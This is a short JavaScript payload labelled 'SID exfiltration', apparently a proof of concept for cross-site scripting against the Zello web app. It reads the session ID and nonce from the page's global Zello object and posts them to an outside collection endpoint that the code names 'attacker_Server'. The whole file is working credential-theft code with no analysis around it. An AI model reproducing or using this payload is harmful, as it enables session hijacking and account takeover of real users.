//SID exfiltration

(async function(){
    try{
        if(typeof Zello==='undefined'){
            console.log('Zello Object Not Found! Be authenticated');
            return;
        }
        const sid= Zello.sid || Zello['sid'];
        const nonce= Zello.nonce || Zello['nonce'];
		console.log(sid,nonce)

        const attacker_Server='https://ywhftw.free.beeceptor.com'
        await fetch(attacker_Server,{
            method:'POST',           
            body:new URLSearchParams({
                sid:sid,
                nonce:nonce
            })
        })

    }
    catch(e){
        console.log("Error due to",e)
    }
})()